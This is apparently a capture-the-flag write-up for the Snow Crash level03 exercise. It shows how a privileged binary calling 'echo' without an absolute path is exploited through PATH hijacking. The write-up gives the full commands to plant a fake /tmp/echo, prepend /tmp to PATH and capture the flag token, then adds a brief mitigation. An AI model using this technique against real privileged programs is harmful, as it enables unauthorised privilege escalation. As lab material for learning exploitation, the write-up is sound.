# Level03 - Snow Crash Exploit

## Description

While exploring the `level03` directory, I found an executable file named `level03`. Running the file produced the following output:

```
Exploit me
```

To investigate further, I used `ltrace` to trace calls to dynamic library functions (like `printf`, `strcpy`, `malloc`, etc.) made by the program at runtime:

```bash
ltrace ./level03
```

This revealed the following command being executed internally:

```
system("/usr/bin/env echo Exploit me")
```

Since `echo` is not called with an absolute path, an attacker can trick the program into executing a malicious script by modifying the `PATH` environment variable.

## Exploitation Steps

1. **Create a Malicious `echo` Script:**
    ```bash
    echo -e '#!/bin/bash\n/bin/getflag' > /tmp/echo
    chmod +x /tmp/echo
    ```

2. **Prepend `/tmp` to the `PATH`:**
    ```bash
    export PATH="/tmp:$PATH"
    ```

3. **Run the Vulnerable Program:**
    ```bash
    ./level03
    ```

4. **Result:**
    ```
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    ```

## Mitigation

To prevent this vulnerability, always use absolute paths when executing binaries in privileged programs.

##